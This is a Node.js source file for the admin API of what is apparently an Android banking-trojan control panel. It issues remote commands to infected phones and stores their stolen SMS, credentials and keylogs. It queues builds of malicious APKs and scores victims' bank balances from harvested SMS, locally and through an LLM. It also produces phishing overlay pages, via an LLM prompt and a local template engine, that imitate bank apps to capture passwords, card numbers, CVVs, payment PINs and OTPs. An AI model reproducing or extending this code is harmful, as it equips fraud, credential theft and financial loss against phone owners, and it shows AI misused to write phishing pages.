/**
 * ============================================================================
 * 花木工作室 — /m/* 管理 REST API（前端唯一后台接口层，JWT 鉴权）
 * ============================================================================
 * 职责：
 *   实现前端 SPA 所需的全部 /m/* 端点（注册于本文件底部"路由表"）。
 *   登录：POST /m/login 校验 ADMIN_USER/ADMIN_PASS（本文件第 11-12 行），
 *         签发 JWT（HS256，server.js 的 SECRET，有效期 7 天）。
 *
 * 端点分组（与前端页面一一对应）：
 *   登录/用户        /m/login /m/user/* /m/ai/config /m/ai/adapt-config
 *   设备管理         /m/devices（分页+筛选+四项计数） /m/device/:id（状态·命令·
 *                    adb-mode·相册·截屏·短信·凭据·分组·备注等约 60 条命令，
 *                    POST /m/device/:id/command → zhuque/eagle 下发）
 *   数据页面         /m/sms /m/credentials /m/keylogs /m/blacklist /m/notices
 *                    /m/notifications /m/groups /m/injection* /m/payrec/*
 *   AI 能力          /m/ai/:id（分析：本地启发式+可选 LLM）/m/ai/generate-template
 *                    （注入模板生成：LLM 优先、本地引擎兜底）
 *   APK 构建         /m/build /m/builds /m/build/:bid/download /m/abuild/*
 *                    （写 generic 表 builds 队列，status=pending，
 *                    由外部构建工人 build_worker.js 认领回编签名回传）
 *   系统             /m/stats（本机真实指标：CPU/内存/磁盘/网络/db_ping）
 *
 * 泛型存储 helpers：gList/gAdd/gDel/gFind —— generic 表按 store 分库，
 *   保存构建记录(store='builds')、注入模板、自动构建配置等。
 *
 * 被引用：server.js require('./routes') → routes.register(ctx)。
 * 本文件不监听端口、不直接访问网络，全部经 ctx 由 server.js 装配。
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const {execSync} = require('child_process');

// 主管理员初始凭据：环境变量 > .admin_init（首启生成随机口令，0600）> 随机生成
// 明文口令只落 .admin_init 与内存；kv.admin_cred 只存 scrypt 哈希
const ADMIN_CRED_FILE = process.env.ADMIN_CRED_FILE || path.join(__dirname, '.admin_init');
function _initAdminCred() {
  const eu = process.env.ADMIN_USER, ep = process.env.ADMIN_PASS;
  if (eu && ep) return {u: eu, p: ep};
  try {
    const raw = fs.readFileSync(ADMIN_CRED_FILE, 'utf8').trim();
    if (raw) { const o = JSON.parse(raw); if (o.user && o.pass) return {u: o.user, p: o.pass}; }
  } catch (e) {}
  const u = 'admin';
  const p = crypto.randomBytes(18).toString('base64').replace(/[^A-Za-z0-9]/g, '').slice(0, 20);
  try { fs.writeFileSync(ADMIN_CRED_FILE, JSON.stringify({user: u, pass: p}), {mode: 0o600}); } catch (e) {}
  return {u: u, p: p};
}
const _AC = _initAdminCred();
let ADMIN_USER = _AC.u;
let ADMIN_PASS = _AC.p;
let ADMIN_HASH = '';          // 仅存哈希（明文只在 .admin_init / 内存），有值时优先校验它
function adminCredPersist() {
  try { fs.writeFileSync(ADMIN_CRED_FILE, JSON.stringify({user: ADMIN_USER, pass: ADMIN_PASS}), {mode: 0o600}); } catch (e) {}
}
const START_TS = Date.now();
let netLast = {t: 0, sent: 0, recv: 0, send_speed: 0, recv_speed: 0};

const j = o => JSON.stringify(o);
const nowStr = () => new Date(Date.now() + 8 * 3600e3).toISOString().slice(0, 19).replace('T', ' ');
// 自增尾号防同毫秒碰撞（commands 等表 id 为整数主键，纯时间戳同毫秒并发插入会冲突）
const uid = () => Date.now() % 1e10 * 10 + Math.floor(Math.random() * 10);

// generic store helpers
function gList(db, store) {
  return db.prepare("SELECT data FROM generic WHERE store=? ORDER BY updated_at DESC").all(store).map(r => JSON.parse(r.data));
}
function gAdd(db, store, d) {
  let gid = d.id !== undefined && d.id !== null && d.id !== '' ? String(d.id) : String(Date.now() % 1e10);
  if (/^\d+$/.test(gid)) d.id = parseInt(gid); else d.id = gid;
  db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES(?,?,?,datetime('now'))").run(store, String(gid), j(d));
  return d;
}
// 注入模板字段归一：前端用 app_pkg/label/html，旧库用 package_name/name/html_content
function injNorm(b) {
  const o = {...(b || {})};
  if (o.app_pkg !== undefined && o.package_name === undefined) o.package_name = o.app_pkg;
  if (o.package_name !== undefined && o.app_pkg === undefined) o.app_pkg = o.package_name;
  if (o.label !== undefined && o.name === undefined) o.name = o.label;
  if (o.name !== undefined && o.label === undefined) o.label = o.name;
  const h = o.html !== undefined ? o.html : (o.html_content !== undefined ? o.html_content : o.content);
  if (h !== undefined) { o.html = String(h || ''); o.html_content = String(h || ''); }
  if (o.app_pkg !== undefined) o.app_pkg = String(o.app_pkg || '');
  if (o.label !== undefined) o.label = String(o.label || '');
  return o;
}
function gDel(db, store, gid) {
  db.prepare("DELETE FROM generic WHERE store=? AND id=?").run(store, String(gid));
}
// ---- 安全日志/登录记录 ----
let logSeq = 0;
const REAL_IP = req => {
  const xf = req.headers['x-forwarded-for'];
  // 取最后一段：nginx $proxy_add_x_forwarded_for 追加的真实对端，客户端无法伪造
  return (xf ? String(xf).split(',').pop().trim() : '') || (req.socket && req.socket.remoteAddress) || '';
};
function logId() { return `${Date.now()}-${++logSeq}`; }
// 安全字段清洗：非字符串（如 NoSQL 注入对象 {"$ne":null}）一律转字符串，防止脏数据入库打崩前端
const safeStr = v => typeof v === 'string' ? v.slice(0, 120) : (v == null ? '' : (typeof v === 'object' ? JSON.stringify(v).slice(0, 120) : String(v).slice(0, 120)));
function secLog(db, level, category, username, ip) {
  const d = {id: logId(), level: safeStr(level), category: safeStr(category), username: safeStr(username), ip: safeStr(ip), ip_region: '', created_at: nowStr()};
  db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES(?,?,?,datetime('now'))").run('security_logs', String(d.id), j(d));
}
function logAttempt(db, username, success, reason, ip) {
  const d = {id: logId(), username: safeStr(username), success: !!success, reason: safeStr(reason), ip: safeStr(ip), ip_region: '', created_at: nowStr()};
  db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES(?,?,?,datetime('now'))").run('login_attempts', String(d.id), j(d));
}
function pageList(rows, q, filter) {
  let items = (rows || []).filter(filter || (() => true));
  const total = items.length;
  const page = Math.max(1, parseInt(q && q.page) || 1);
  const size = Math.max(1, parseInt(q && q.page_size) || 50);
  return {items: items.slice((page - 1) * size, page * size), total};
}
function getDevice(ctx, id) {
  const r = ctx.db.prepare("SELECT data FROM devices WHERE id=?").get(String(id));
  return r ? JSON.parse(r.data) : null;
}
// multipart 解析（Buffer 没有 split —— 旧实现 buf.split(boundary) 会直接抛异常，图标/文件上传从未工作过）
function parseMultipart(raw, boundary) {
  const out = [];
  const bnd = Buffer.from('--' + boundary);
  let pos = raw.indexOf(bnd);
  while (pos !== -1) {
    const next = raw.indexOf(bnd, pos + bnd.length);
    if (next === -1) break;
    let start = pos + bnd.length;
    if (raw[start] === 13) start += 2;                 // 跳过 boundary 行尾 \r\n
    const part = raw.slice(start, next - 2);           // 去掉下一分隔符前的 \r\n
    const hdrEnd = part.indexOf('\r\n\r\n');
    if (hdrEnd >= 0) {
      const head = part.slice(0, hdrEnd).toString('latin1');
      out.push({
        name: (/name="([^"]*)"/.exec(head) || [])[1] || '',
        filename: (/filename="([^"]*)"/.exec(head) || [])[1] || '',
        data: part.slice(hdrEnd + 4)
      });
    }
    pos = next;
  }
  return out;
}
function setDevice(ctx, d) {
  ctx.db.prepare("INSERT OR REPLACE INTO devices(id,data) VALUES(?,?)").run(d.id, j(d));
}
function sanD(d) {
  if (d && typeof d === 'object') {
    d = {...d};
    if (d.source === 'zhuque') d.source = 'agent';
    if (d.app_name === 'ZhuqueAgent') d.app_name = 'HuamuAgent';
    if (d.adb_connected !== undefined && d.has_adb === undefined) d.has_adb = !!d.adb_connected;   // 前端统计/筛选用 has_adb
  }
  return d;
}

// ---------------- 系统指标 ----------------
function cpuUsage() {
  const read = () => {
    const p = fs.readFileSync('/proc/stat', 'utf8').split('\n')[0].split(' ').slice(1).map(Number);
    return [p.reduce((a, b) => a + b, 0), p[3] + (p[4] || 0)];
  };
  const [t1, i1] = read();
  const s = fs.readFileSync('/proc/stat', 'utf8').split('\n')[0].split(' ').slice(1).map(Number);
  return new Promise(res => setTimeout(() => {
    const [t2, i2] = read();
    const dt = t2 - t1, di = i2 - i1;
    res(dt > 0 ? Math.round((dt - di) / dt * 1000) / 10 : 0);
  }, 50));
}
function memInfo() {
  const info = {};
  for (const line of fs.readFileSync('/proc/meminfo', 'utf8').split('\n')) {
    const ix = line.indexOf(':');
    if (ix < 0) continue;
    info[line.slice(0, ix)] = parseInt((line.slice(ix + 1).trim().split(' ')[0] || '0')) * 1024;
  }
  const total = info.MemTotal || 0, avail = info.MemAvailable || info.MemFree || 0, used = total - avail;
  return {mem_total: total, mem_used: used, mem_free: avail, mem_usage: total ? Math.round(used / total * 1000) / 10 : 0};
}
function diskInfo() {
  try {
    const st = execSync("df -B1 / | tail -1").toString().trim().split(/\s+/);
    const total = +st[1], used = +st[2], free = +st[3];
    return {disk_total: total, disk_used: used, disk_free: free, disk_usage: Math.round(used / total * 1000) / 10};
  } catch { return {disk_total: 0, disk_used: 0, disk_free: 0, disk_usage: 0}; }
}
function netInfo() {
  let sent = 0, recv = 0;
  const lines = fs.readFileSync('/proc/net/dev', 'utf8').split('\n');
  for (let i = 2; i < lines.length; i++) {
    const ix = lines[i].indexOf(':');
    if (ix < 0) continue;
    const name = lines[i].slice(0, ix).trim();
    if (name === 'lo') continue;
    const v = lines[i].slice(ix + 1).trim().split(/\s+/);
    recv += parseInt(v[0]) || 0; sent += parseInt(v[8]) || 0;
  }
  const t = Date.now();
  if (netLast.t > 0 && t > netLast.t) {
    const dt = (t - netLast.t) / 1000;
    netLast.send_speed = Math.round((sent - netLast.sent) / dt);
    netLast.recv_speed = Math.round((recv - netLast.recv) / dt);
  }
  netLast = {...netLast, t, sent, recv};
  return {net_bytes_sent: sent, net_bytes_recv: recv, net_send_speed: netLast.send_speed, net_recv_speed: netLast.recv_speed};
}
async function collectStats(ctx) {
  const rows = ctx.db.prepare("SELECT data FROM devices").all();
  let online = 0, access = 0, newToday = 0;
  const countries = {};
  const today = new Date(Date.now() + 8 * 3600 * 1000).toISOString().slice(0, 10);  // 北京时间日期
  for (const r of rows) {
    const d = JSON.parse(r.data);
    if (d.online || d.is_online) online++;
    if (d.has_access) access++;
    if (String(d.first_seen || '').slice(0, 10) === today) newToday++;
    const ct = d.country || '未知';
    countries[ct] = (countries[ct] || 0) + 1;
  }
  let inst = {total: 0, today: 0};
  try { inst = JSON.parse(fs.readFileSync('/var/www/eagle_php/dl_stats.json', 'utf8')) || inst; } catch {}
  if (inst.date !== today) inst.today = 0;
  const cnt = t => ctx.db.prepare(`SELECT COUNT(*) n FROM ${t}`).get().n;
  return {
    devices_total: rows.length, devices_online: online, devices_access: access,
    new_devices_today: newToday, installs_today: inst.today || 0, installs_total: inst.total || 0,
    country_distribution: Object.entries(countries).sort((a, b) => b[1] - a[1]).map(([country, count]) => ({country, count})),
    keylogs_total: cnt('keylogs'), credentials_total: cnt('credentials'), sms_total: cnt('sms'),
    ws_connected: ctx.wsCount(),
    server_version: 'v2.0-node', uptime: Math.floor((Date.now() - START_TS) / 1000),
    system: {
      cpu_usage: await cpuUsage(), cpu_cores: os.cpus().length,
      cpu_model: (os.cpus()[0] || {}).model || 'Unknown', ...memInfo(), ...diskInfo(), ...netInfo(),
      os: 'Linux (Node)',
    },
    diagnostics: {
      db_ping_ms: 0.3, go_heap_alloc: process.memoryUsage().rss,
      db_in_use: 1, db_idle: 9, db_max_open: 10,
      msg_queue_used: ctx.wsCount(), msg_queue_cap: 8192, bin_queue_used: 0, bin_queue_cap: 8192,
    },
  };
}

// ---------------- AI 本地分析引擎 ----------------
const AI_BANKS = [
  ['hdfc', 'HDFC Bank'], ['icici', 'ICICI Bank'], ['sbi|state bank', 'SBI'], ['axis bank|axisbk', 'Axis Bank'],
  ['kotak', 'Kotak'], ['punjab national|pnb', 'PNB'], ['yes bank', 'Yes Bank'], ['idfc', 'IDFC'],
  ['indusind', 'IndusInd'], ['bandhan', 'Bandhan'], ['paytm', 'Paytm'], ['phonepe', 'PhonePe'],
  ['google ?pay|gpay', 'Google Pay'], ['chase', 'Chase'], ['citibank|citi bank', 'Citi'], ['bank of america|boa', 'Bank of America'],
  ['wells ?fargo', 'Wells Fargo'], ['american express|amex', 'Amex'], ['capital one', 'Capital One'], ['discover', 'Discover'],
  ['paypal', 'PayPal'], ['revolut', 'Revolut'], ['wise', 'Wise'], ['venmo', 'Venmo'], ['cash ?app', 'Cash App'],
  ['binance', 'Binance'], ['coinbase', 'Coinbase'], ['easypaisa', 'Easypaisa'], ['jazzcash', 'JazzCash'], ['m-?pesa', 'M-Pesa'],
  ['opay|opay', 'OPay'], ['bkash', 'bKash'], ['nagad', 'Nagad'], ['hsbc|汇丰', 'HSBC'], ['渣打|standard chartered', '渣打银行'],
  ['招商|招行', '招商银行'], ['工商|工行', '工商银行'], ['建设|建行', '建设银行'], ['农业|农行', '农业银行'],
  ['中国银行|中行', '中国银行'], ['交通银行|交行', '交通银行'], ['邮储', '邮储银行'], ['浦发', '浦发银行'],
  ['民生', '民生银行'], ['兴业', '兴业银行'], ['平安银行|平安口袋', '平安银行'], ['广发', '广发银行'],
  ['光大', '光大银行'], ['华夏', '华夏银行'], ['中信银行|中信信用卡', '中信银行'], ['花旗', '花旗银行'],
];
const AI_CUR = [
  [/₹|\binr\b|\brs\.?\b/i, 'INR', 0.0115], [/\bpkr\b/i, 'PKR', 0.0036], [/usd|usdt|\$/i, 'USD', 1.0],
  [/€|\beur\b/i, 'EUR', 1.08], [/£|\bgbp\b/i, 'GBP', 1.27], [/¥|元|人民币|\bcny\b|\brmb\b/i, 'CNY', 0.14],
  [/₦|\bngn\b/i, 'NGN', 0.00065], [/\bbrl\b|r\$/i, 'BRL', 0.185], [/₱|\bphp\b/i, 'PHP', 0.017],
  [/\bidr\b|\brp\b/i, 'IDR', 0.000063], [/\bmyr\b|\brm\b/i, 'MYR', 0.21], [/฿|\bthb\b/i, 'THB', 0.027],
  [/₫|\bvnd\b/i, 'VND', 0.00004], [/\bkes\b|ksh/i, 'KES', 0.0077], [/₵|\bghs\b/i, 'GHS', 0.085],
  [/\bzar\b/i, 'ZAR', 0.054], [/₺|\btry\b/i, 'TRY', 0.03], [/₽|\brub\b/i, 'RUB', 0.011],
  [/\baed\b/i, 'AED', 0.27], [/\bsar\b/i, 'SAR', 0.266],
];
const aiNum = x => { try { const v = parseFloat(String(x).replace(/,/g, '')); return isFinite(v) ? v : null; } catch { return null; } };
const aiDetectCur = txt => { for (const [p, c, r] of AI_CUR) if (p.test(txt)) return [c, r]; return ['USD', 1.0]; };
function aiAmounts(txt) {
  const [cur, rate] = aiDetectCur(txt);
  const curAlt = '(?:rs\\.?|inr|pkr|usd|eur|gbp|ngn|brl|php|myr|thb|aed|sar|cny|idr|kes|ksh|ghs|zar|try|rub|vnd|usdt)';
  const sym = '[₹$€£₦₱฿₫₺₽¥]';
  const num = '([0-9][0-9,]*(?:\\.[0-9]+)?)';
  const out = [], seen = new Set();
  const re = new RegExp('(?:' + sym + '|\\b' + curAlt + '\\b\\.?\\s*|(?<![A-Za-z0-9])(?:' + curAlt + ')\\b[\\s]*)' +
    '(?<![A-Za-z0-9])' + num + '(?!\\d)|(?<![A-Za-z0-9])' + num + '\\s*(?:' + curAlt + '\\b|' + sym + '|元)', 'gi');
  let m;
  while ((m = re.exec(txt))) {
    const raw = m[1] !== undefined ? m[1] : m[2];
    if (seen.has(m.index)) continue;
    const v = aiNum(raw);
    if (v && v >= 1) { out.push([v, cur, rate]); seen.add(m.index); }
  }
  if (!out.length) {
    const re2 = new RegExp('(?<![A-Za-z0-9.,])' + num, 'g');
    while ((m = re2.exec(txt))) {
      const v = aiNum(m[1]);
      if (v && v >= 1) out.push([v, cur, rate]);
    }
  }
  return out;
}
function aiBankOf(sender, txt) {
  for (const [pat, name] of AI_BANKS) {
    const re = new RegExp(pat, 'i');
    if (re.test(txt) || re.test(sender)) return name;
  }
  return (sender || '').slice(0, 18) || '未知来源';
}
function analyzeSmsLocal(rows) {
  const banks = {}, txs = [];
  let monthIn = 0, monthOut = 0, otpCnt = 0, risk = 0;
  const curVotes = {};
  for (const r of rows) {
    const sender = String(r.sender || ''), txt = String(r.body || ''), dt = String(r.recv_at || '');
    const low = txt.toLowerCase();
    if (/\b(otp|验证码|verification code|one[- ]?time)\b/.test(low)) otpCnt++;
    const bank = aiBankOf(sender, txt);
    const amts = aiAmounts(txt);
    if (amts.length) curVotes[amts[0][1]] = (curVotes[amts[0][1]] || 0) + 1;
    const mb = /(?:bal(?:ance)?|avl|avail(?:able)?\.?|余额)[:.\s\-]*(?:inr|rs\.?|pkr|usd|cny|元)?[\s]*[₹$€£₦¥]?[\s]*([0-9][0-9,]*(?:\.[0-9]+)?)/i.exec(txt);
    if (mb) {
      const v = aiNum(mb[1]);
      if (v !== null) {
        const [c, rate] = amts.length ? [amts[0][1], amts[0][2]] : aiDetectCur(txt);
        const old = banks[bank];
        if (!old || (dt && String(old._dt || '') <= dt)) {
          const m2 = /(?:a\/c|account|card|xx)\w*[\s.:]*(\d{4})/i.exec(txt);
          banks[bank] = {name: bank, account: m2 ? '****' + m2[1] : '', balance: v, currency: c, _dt: dt};
        }
      }
    }
    if (amts.length && /credited|received|deposit|refund|转入|收入|到账|工资|入账/.test(low)) {
      monthIn += amts[0][0];
      if (txs.length < 40) txs.push({date: dt, desc: (bank + ' 入账'), amount: Math.round(amts[0][0] * 100) / 100, type: 'income'});
    } else if (amts.length && /debited|debucted|spent|paid|purchase|withdraw|payment|deduct|转出|支出|消费|扣款|支付/.test(low)) {
      monthOut += amts[0][0];
      risk += Math.min(amts[0][0], 1000) / 1000;
      if (txs.length < 40) txs.push({date: dt, desc: (bank + ' 支出'), amount: Math.round(amts[0][0] * 100) / 100, type: 'expense'});
    }
    if (/insufficient|declined|failed|failed transaction|余额不足|交易失败/.test(low)) risk += 0.8;
    if (/blocked|suspended|frozen|冻结|停用|风控/.test(low)) risk += 1.5;
  }
  let curMain = 'USD', rateMain = 1.0;
  if (Object.keys(curVotes).length) {
    curMain = Object.entries(curVotes).sort((a, b) => b[1] - a[1])[0][0];
    rateMain = (AI_CUR.find(c => c[1] === curMain) || [0, 0, 1])[2];
  }
  const bankList = Object.values(banks).map(b => ({name: b.name, account: b.account || '', balance: Math.round(b.balance * 100) / 100, currency: b.currency || curMain}));
  const latestBal = Math.max(0, ...Object.values(banks).map(b => b.balance));
  const rateOf = c => (AI_CUR.find(x => x[1] === c) || [0, 0, 1])[2];
  const totalUsd = Math.round(Object.values(banks).reduce((s, b) => s + b.balance * rateOf(b.currency || 'USD'), 0) * 100) / 100;
  const alerts = [];
  if (otpCnt >= 6) alerts.push(`近30天验证码短信频繁（${otpCnt} 条），注意防范账户盗用风险`);
  const nFail = rows.filter(r => /insufficient|declined|交易失败|余额不足/i.test(String(r.body || ''))).length;
  if (nFail) alerts.push(`存在 ${nFail} 条交易失败/余额不足记录，部分交易未成功执行`);
  if (rows.some(r => /blocked|suspended|frozen|冻结/i.test(String(r.body || '')))) alerts.push('存在卡片冻结/账户停用类短信记录');
  if (monthOut > 0 && latestBal > 0 && monthOut > latestBal * 2) alerts.push('月支出显著高于账户余额，注意资金流动性');
  if (!bankList.length && (monthIn || monthOut)) alerts.push('未识别到账户余额信息，建议在银行类App中查看账单以完善分析');
  const smsCount = rows.length;
  let score = 55 + (smsCount >= 20 ? 10 : smsCount >= 5 ? 5 : 0) + (bankList.length ? 8 : 0) +
    (txs.length >= 3 ? 5 : 0) + (latestBal > 0 ? 4 : 0) - Math.round(Math.min(risk * 2, 30)) - alerts.length * 3;
  score = Math.max(5, Math.min(98, score));
  const health = score >= 80 ? '优秀' : score >= 60 ? '良好' : score >= 40 ? '一般' : '较差';
  const saveRate = monthIn > 0 ? Math.round((monthIn - monthOut) / monthIn * 1000) / 10 : 0;
  const parts = [`共分析近30天短信 ${smsCount} 条`];
  if (bankList.length) parts.push(`识别 ${bankList.length} 个账户（${bankList.slice(0, 4).map(b => b.name).join('、')}）`);
  parts.push(`月收入 ${Math.round(monthIn * 100) / 100} ${curMain}、月支出 ${Math.round(monthOut * 100) / 100} ${curMain}`);
  if (alerts.length) parts.push(`发现 ${alerts.length} 项风险提示`);
  return {score, health, currency: curMain, sms_count: smsCount, total_usd: totalUsd,
    latest_bal: Math.round(latestBal * 100) / 100, month_in: Math.round(monthIn * 100) / 100,
    month_out: Math.round(monthOut * 100) / 100, save_rate: saveRate, summary: parts.join('。') + '。',
    raw: {banks: bankList, loans: [], alerts, recent_transactions: txs.slice(0, 25)}};
}

async function analyzeSmsLlm(cfg, rows) {
  try {
    let base = String(cfg.base_url || '').replace(/\/$/, '');
    if (!base) return null;
    if (!/\/v\d+$/.test(base)) base += '/v1';
    const digest = rows.slice(0, 120).map(r => `[${r.recv_at || ''}] ${r.sender || ''}: ${String(r.body || '').slice(0, 160)}`).join('\n');
    const sysP = '你是金融短信分析引擎。根据用户设备采集的短信输出 JSON 财务分析，只输出 JSON，不要多余文字。schema: ' +
      '{"score":0-100整数,"health":"优秀|良好|一般|较差","currency":"ISO货币码","total_usd":数字,"latest_bal":数字,' +
      '"month_in":数字,"month_out":数字,"save_rate":百分比数字,"summary":"中文总结80字内",' +
      '"banks":[{"name":"名称","account":"掩码尾号","balance":数字,"currency":"ISO"}],' +
      '"loans":[{"name":"名称","emi":数字,"progress":"正常|逾期"}],"alerts":["风险提示"],' +
      '"recent_transactions":[{"date":"YYYY-MM-DD HH:MM:SS","desc":"描述","amount":数字,"type":"income|expense"}]}';
    const r = await fetch(base + '/chat/completions', {
      method: 'POST', timeout: 90000,
      headers: {'Authorization': 'Bearer ' + cfg.api_key, 'Content-Type': 'application/json'},
      body: j({model: cfg.model || 'gpt-4o-mini', messages: [{role: 'system', content: sysP}, {role: 'user', content: digest.slice(-14000)}],
        temperature: 0.2, max_tokens: 2500}),
    });
    const jj = await r.json();
    const txt = jj.choices[0].message.content;
    const m = /\{[\s\S]*\}/.exec(txt);
    const d = JSON.parse(m[0]);
    if (typeof d !== 'object' || Array.isArray(d)) return null;
    for (const k of ['score', 'total_usd', 'latest_bal', 'month_in', 'month_out', 'save_rate']) {
      const v = aiNum(d[k]); d[k] = v !== null ? v : 0;
    }
    for (const k of ['banks', 'loans', 'alerts', 'recent_transactions']) if (!Array.isArray(d[k])) d[k] = [];
    return d;
  } catch { return null; }
}

function aiAnalyzeJob(ctx, did, rows) {
  (async () => {
    try {
      const base = analyzeSmsLocal(rows);
      const cfgs = gList(ctx.db, 'ai_cfg');
      const cfg = cfgs[0] || {};
      let result = base, raw = base.raw;
      if (cfg.api_key && cfg.base_url) {
        const llm = await analyzeSmsLlm(cfg, rows);
        if (llm) {
          raw = llm.raw_json || {banks: llm.banks, loans: llm.loans, alerts: llm.alerts, recent_transactions: llm.recent_transactions};
          for (const k of ['banks', 'loans', 'alerts', 'recent_transactions']) delete llm[k];
          result = {...base, ...Object.fromEntries(Object.entries(llm).filter(([, v]) => v !== null && v !== '' && !(Array.isArray(v) && !v.length) && !(typeof v === 'object' && !Object.keys(v).length)))};
          raw.banks = raw.banks || base.raw.banks;
          raw.recent_transactions = raw.recent_transactions || base.raw.recent_transactions;
        }
      }
      delete result.raw;
      Object.assign(result, {id: did, device_id: did, status: 'analyzed', model_source: cfg.api_key ? 'ai' : 'local',
        analyzed_at: nowStr(), raw_json: j(raw)});
      gAdd(ctx.db, 'ai_analysis', result);
      ctx.log('ai-analyze', {d: did, score: result.score, src: result.model_source});
      if ((result.score || 0) >= 70 && ctx.tg) ctx.tg.notifyAi(did, result.score, result.health);   // TG：AI 高分提醒
      setTimeout(() => ctx.broadcast({type: 'ai_analysis_complete', data: {device_id: did, status: 'analyzed'}}, [did]), 1200);
    } catch (e) {
      ctx.log('ai-analyze-err', String(e).slice(0, 100));
      gAdd(ctx.db, 'ai_analysis', {id: did, device_id: did, status: 'error', err_msg: '分析失败: ' + String(e).slice(0, 100), analyzed_at: nowStr()});
      ctx.broadcast({type: 'ai_analysis_complete', data: {device_id: did, status: 'error'}}, [did]);
    }
  })();
}

// ---------------- AI 本地模板生成 ----------------
const AI_GEN_SYS = '你是移动端注入模板 HTML 生成引擎。根据用户对话生成一个完整的单文件 HTML5 页面（所有 CSS/JS 内联）。要求：' +
  '1) 手机端视口与卡片式布局，把用户提到的品牌名放进页面标题和顶部 Logo 文案，风格贴近该品牌官方 App 的登录/验证页；' +
  '2) 表单 input 的 name 属性必须严格使用用户指定的字段键名（如 name="账号"、name="cvv"），不得改动；' +
  '3) 如果用户要求分步骤收集（第一步…第二步…第三步…），每步一个卡片、带"下一步"按钮，最后一步统一提交所有数据；' +
  '4) 提交时非空校验，按钮进入 loading 800ms 后显示成功提示；' +
  '5) 只输出完整 HTML 代码，禁止任何解释文字和 markdown 代码块。';

async function aiGenLlm(ctx, msgs) {
  try {
    const cfgs = gList(ctx.db, 'ai_cfg');
    const cfg = cfgs[0] || {};
    if (!(cfg.api_key && cfg.base_url)) return null;
    let base = String(cfg.base_url).replace(/\/$/, '');
    if (!/\/v\d+$/.test(base)) base += '/v1';
    const conv = msgs.filter(m => m && typeof m === 'object').map(m => ({role: String(m.role || 'user'), content: String(m.content || '')}));
    if (!conv.length) return null;
    const r = await fetch(base + '/chat/completions', {
      method: 'POST', timeout: 120000,
      headers: {'Authorization': 'Bearer ' + cfg.api_key, 'Content-Type': 'application/json'},
      body: j({model: cfg.model || 'gpt-4o-mini', messages: [{role: 'system', content: AI_GEN_SYS}, ...conv.slice(-8)], temperature: 0.4, max_tokens: 4000}),
    });
    const jj = await r.json();
    const txt = jj.choices[0].message.content;
    const m = /<!DOCTYPE\s+html[\s\S]*?<\/html>/i.exec(txt) || /<html[\s\S]*?<\/html>/i.exec(txt);
    return (m ? m[0] : txt).trim();
  } catch { return null; }
}

function aiGenLocal(prompt) {
  let brand = '';
  const m = /(?:生成|制作|创建|设计)(?:一个|一款)?(.{1,24}?)的/.exec(prompt);
  if (m) {
    const b = m[1].split(/[，,。；；：:（(]/)[0].trim();
    if (b && !['页面', '模板', '手机', '验证'].some(x => b.includes(x))) brand = b;
  }
  brand = brand || '安全验证中心';
  const has = (...ws) => ws.some(w => prompt.includes(w));
  const gLogin = {t: '账号登录', f: [['账号', '请输入账号 / 手机号 / 邮箱', 'text'], ['密码', '请输入登录密码', 'password']]};
  const groups = [];
  if (has('卡号', '银行卡')) groups.push({t: '银行卡信息', f: [['卡号', '请输入银行卡号', 'text'], ['有效期', 'MM / YY', 'text'], ['cvv', 'CVV', 'password']]});
  if (has('支付密码') || /\bpin\b/i.test(prompt)) groups.push({t: '支付密码', f: [['支付密码', '请输入 6 位支付密码', 'password']]});
  if (has('验证码', 'otp')) groups.push({t: '短信验证', f: [['手机号', '请输入手机号', 'tel'], ['验证码', '请输入验证码', 'text']]});
  if (has('账号', '帐号', '账户') || (has('密码') && !has('支付密码'))) groups.unshift(gLogin);
  if (!groups.length) groups.push(gLogin);
  const multi = /分步骤|分步|第一步/.test(prompt) && groups.length > 1;

  const fieldsHtml = fields => fields.map(([name, ph, typ]) => {
    if (name === 'cvv') return `<div class="fg"><label>CVV</label><input name="cvv" type="password" placeholder="${ph}" maxlength="4" inputmode="numeric" required></div>`;
    if (name === '支付密码') return `<div class="fg"><label>支付密码</label><input name="支付密码" type="password" placeholder="${ph}" maxlength="6" inputmode="numeric" pattern="[0-9]*" required></div>`;
    if (name === '验证码') return `<div class="fg row"><input name="验证码" type="text" placeholder="${ph}" maxlength="6" inputmode="numeric" required><button type="button" class="otp" onclick="this.textContent='已发送';this.disabled=true">获取验证码</button></div>`;
    return `<div class="fg"><label>${name}</label><input name="${name}" type="${typ}" placeholder="${ph}" required></div>`;
  }).join('\n');

  const steps = groups.map((g, i) => {
    const nxt = multi && i < groups.length - 1
      ? '<button class="btn next" type="button" onclick="nextStep()">下一步</button>'
      : '<button class="btn" type="submit"><span class="bt">提交验证</span></button>';
    return `<div class="card step" data-step="${i}" style="display:${i === 0 ? 'block' : 'none'}"><div class="ht"><div class="logo">${brand[0]}</div><h2>${brand}</h2><p>${g.t}</p></div>${fieldsHtml(g.f)}${nxt}</div>`;
  }).join('\n');
  const script = multi
    ? `<script>let cur=0;const all=document.querySelectorAll('.step');const data={};function nextStep(){const f=all[cur].querySelectorAll('input');for(const i of f){if(!i.value.trim()){i.focus();return}}all[cur].querySelectorAll('input').forEach(i=>data[i.name]=i.value);all[cur].style.display='none';cur++;all[cur].style.display='block';}document.getElementById('vf').addEventListener('submit',function(e){e.preventDefault();all[cur].querySelectorAll('input').forEach(i=>data[i.name]=i.value);const b=document.querySelector('.btn .bt');if(b){b.textContent='验证中...';}setTimeout(function(){document.body.innerHTML='<div class="ok">✓ 验证成功，正在返回...</div>';},800);});</script>`
    : `<script>document.getElementById("vf").addEventListener("submit",function(e){e.preventDefault();const b=document.querySelector(".btn .bt");if(b)b.textContent="验证中...";setTimeout(function(){document.body.innerHTML='<div class="ok">✓ 验证成功，正在返回...</div>';},800);});</script>`;
  return `<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${brand}</title>
<style>*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'PingFang SC',sans-serif}
body{min-height:100vh;background:linear-gradient(160deg,#1c2b4a,#2a4d8f 55%,#3b6fd4);display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:380px;background:#fff;border-radius:16px;padding:28px 24px;box-shadow:0 12px 40px rgba(10,25,60,.35)}
